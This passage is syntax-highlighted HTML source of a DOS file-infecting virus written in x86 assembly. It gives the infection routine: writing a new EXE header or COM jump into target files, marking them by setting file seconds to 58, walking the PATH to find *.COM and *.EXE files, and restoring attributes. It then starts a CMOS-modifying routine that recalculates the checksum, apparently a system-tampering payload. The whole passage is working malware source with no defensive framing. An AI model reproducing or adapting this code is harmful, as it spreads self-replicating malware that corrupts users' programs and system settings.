        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">COM_FLAG</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">01</span><span class="sc0">  </span><span class="sc1">;exe file?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DO_COM2</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; 13-Write EXE Header</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">28d</span><span class="sc0">                               </span><span class="sc1">;#of bytes to write</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_CODE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;ds:dx=pointer of data to write</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">CONT</span><span class="sc0">

</span><span class="sc1">;****************************************************</span><span class="sc0">
</span><span class="sc1">; 14-write new 4 bytes to beginning of file (COM)</span><span class="sc0">
</span><span class="sc1">;***************************************************</span><span class="sc0">

</span><span class="sc5">DO_COM2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_IMAGE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                                 </span><span class="sc1">;#of bytes to write</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">START_IMAGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;ds:dx=pointer of data to write</span><span class="sc0">

</span><span class="sc5">CONT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                               </span><span class="sc1">;DOS write function</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                                  </span><span class="sc1">;write 5 / 28 bytes</span><span class="sc0">

</span><span class="sc1">;*************************************************</span><span class="sc0">
</span><span class="sc1">; 15-Restore date and time of file to be infected</span><span class="sc0">
</span><span class="sc1">;*************************************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_DATE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_TIME</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFE0h</span><span class="sc0">                             </span><span class="sc1">;mask all but seconds</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">   </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc0">                                </span><span class="sc1">;seconds to 58</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">GET_OUT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;****************</span><span class="sc0">
</span><span class="sc1">; 16-Close File</span><span class="sc0">
</span><span class="sc1">;****************</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">                          </span><span class="sc1">;save flags to return on exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">;close file</span><span class="sc0">

</span><span class="sc1">;*************************************************</span><span class="sc0">
</span><span class="sc1">; 17-Restore file's attributes</span><span class="sc0">
</span><span class="sc1">;*************************************************</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                                  </span><span class="sc1">;set file attributes to cx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_AREA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;dx=ptr to path + current filename</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_ATTR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get old attributes</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">                                          </span><span class="sc1">;restore flags to return on exit</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                           </span><span class="sc1">;infection done!</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">CALCULATE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     </span><span class="sc1">;dx * 4096</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     </span><span class="sc1">;ax / 16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;dx = dx * 4096 + ax / 16 =SS CS</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">    </span><span class="sc1">;ax = ax and 0Fh          =SP IP</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">FIND_FILE</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PSP_SEG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;es=saved PSP segment</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc2">2ch</span><span class="sc0">                             </span><span class="sc1">;es:di points to environment</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">FIND_PATH</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PATH_STR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;source :ds:si = 'P'</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">                             </span><span class="sc1">;load 'P'</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7FFFh</span><span class="sc0">                    </span><span class="sc1">;size of environment= 32768 bytes</span><span class="sc0">
            </span><span class="sc6">not</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;cx=8000h</span><span class="sc0">
            </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                       </span><span class="sc1">;find 'P' in es:di</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">CHECK_NEXT_4</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;check for 'ATH'</span><span class="sc0">
               </span><span class="sc6">scasb</span><span class="sc0">
               </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">FIND_PATH</span><span class="sc0">
               </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CHECK_NEXT_4</span><span class="sc0">

               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PATH_ADDRESS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">            </span><span class="sc1">;save path's address es:di</span><span class="sc0">
               </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_AREA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                 </span><span class="sc1">;restore PSP segment</span><span class="sc0">
               </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">COPY_FILE_SPEC_TO_WORK_AREA</span><span class="sc0">

</span><span class="sc5">NO_FILE_FOUND</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PATH_ADDRESS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;has path string ended?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FOLLOW_THE_PATH</span><span class="sc0">                        </span><span class="sc1">;if not there are more subdirs</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EXIT</span><span class="sc0">                                   </span><span class="sc1">;path string ended.. exit</span><span class="sc0">

</span><span class="sc5">FOLLOW_THE_PATH</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_AREA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;destination es:di = work area</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PATH_ADDRESS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;source      ds:si = Environment</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PSP_SEG</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ds=PSP segment</span><span class="sc0">
                 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc2">2ch</span><span class="sc0">                                </span><span class="sc1">;ds:si points to environment</span><span class="sc0">

</span><span class="sc5">UP_TO_LODSB</span><span class="sc4">:</span><span class="sc0">
                 </span><span class="sc6">lodsb</span><span class="sc0">                               </span><span class="sc1">;get character</span><span class="sc0">
                 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;he he</span><span class="sc0">
                 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc12">';'</span><span class="sc0">                          </span><span class="sc1">;is it a ';'?</span><span class="sc0">
                 </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;he he</span><span class="sc0">
                 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SEARCH_AGAIN</span><span class="sc0">
                 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;end of path string?</span><span class="sc0">
                 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CLEAR_SI</span><span class="sc0">
                 </span><span class="sc6">stosb</span><span class="sc0">                               </span><span class="sc1">;save path marker into di</span><span class="sc0">
                 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">UP_TO_LODSB</span><span class="sc0">

</span><span class="sc5">CLEAR_SI</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;mark the fact that we are looking thru the final subdir</span><span class="sc0">
                  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">SEARCH_AGAIN</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PATH_ADDRESS</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;save address of next subdir</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'\'                     ;ends with a '</span><span class="sc0">\</span><span class="sc13">'?
</span><span class="sc0">                  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">COPY_FILE_SPEC_TO_WORK_AREA</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'                                     ;add '</span><span class="sc0">\</span><span class="sc13">' if not
</span><span class="sc0">                  </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc1">;***********************************************</span><span class="sc0">
</span><span class="sc1">; put *.COM / *.EXE into workspace</span><span class="sc0">
</span><span class="sc1">;***********************************************</span><span class="sc0">

</span><span class="sc5">COPY_FILE_SPEC_TO_WORK_AREA</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">                                      </span><span class="sc1">;ds=cs</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILENAME_PTR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;es:di = WORK_AREA</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                                   </span><span class="sc1">;bp=file spec</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                    </span><span class="sc1">;length of *.com0/ *.EXE0</span><span class="sc0">
                  </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsw</span><span class="sc0">                                   </span><span class="sc1">;move *.COM0/ *.EXE0 to workspace</span><span class="sc0">

</span><span class="sc1">;************************************************</span><span class="sc0">
</span><span class="sc1">; Find FIRST FILE</span><span class="sc0">
</span><span class="sc1">;************************************************</span><span class="sc0">

                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04EH</span><span class="sc0">                     </span><span class="sc1">;DOS function</span><span class="sc0">
                  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">WORK_AREA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;dx points to path in workspace</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                      </span><span class="sc1">;attributes RO or hidden OK</span><span class="sc0">
</span><span class="sc5">FIND_NEXT_FILE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
                  </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">FILE_FOUND</span><span class="sc0">
                  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NO_FILE_FOUND</span><span class="sc0">

</span><span class="sc5">FILE_FOUND</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILENAME_PTR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;destination: es:di</span><span class="sc0">
             </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DTA_File_NAME</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;origin       ds:si</span><span class="sc0">

</span><span class="sc5">MOVE_ASCII_FILENAME</span><span class="sc4">:</span><span class="sc0">
                      </span><span class="sc6">lodsb</span><span class="sc0">                    </span><span class="sc1">;move filename to the end of path</span><span class="sc0">
                      </span><span class="sc6">stosb</span><span class="sc0">
                      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;end of ASCIIZ string?</span><span class="sc0">
                      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">MOVE_ASCII_FILENAME</span><span class="sc0">  </span><span class="sc1">;keep on going</span><span class="sc0">
                      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;restore si to use in the following</span><span class="sc0">
                      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;save COM / EXE string pointer</span><span class="sc0">
                      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CHECK_N_INFECT_FILE</span><span class="sc0"> </span><span class="sc1">;check file if file found</span><span class="sc0">
                      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">;restore COM / EXE string pointer</span><span class="sc0">
                      </span><span class="sc6">jnc</span><span class="sc0">  </span><span class="sc5">EXITX</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;fix bx</span><span class="sc0">
                      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">;save si again</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc0">
                      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">FIND_NEXT_FILE</span><span class="sc0">

</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">
                      </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">EXITX</span><span class="sc4">:</span><span class="sc0">
                      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">CMOS_CHCKSM</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; INPUT:</span><span class="sc0">
</span><span class="sc1">; DL = CMOS ADDRESS of BYTE TO be MODiFiED</span><span class="sc0">
</span><span class="sc1">; BL = NEW BYTE VALUE to be PUT IN CMOS RAM</span><span class="sc0">

</span><span class="sc1">; OUTPUT:</span><span class="sc0">
</span><span class="sc1">; None.</span><span class="sc0">
</span><span class="sc1">; REGISTERS USED: AX,CX,BX,DX</span><span class="sc0">

</span><span class="sc1">;*************************</span><span class="sc0">
</span><span class="sc1">; GET CMOS Checksum =&gt; CX</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">           </span><span class="sc1">;msb of checksum address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">           </span><span class="sc1">;read byte</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;store al in ch</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">           </span><span class="sc1">;lsb of checksum address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">           </span><span class="sc1">;read byte</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;store lsb to cl</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; Fix CMOS Checksum</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;AL = address</span><span class="sc0">
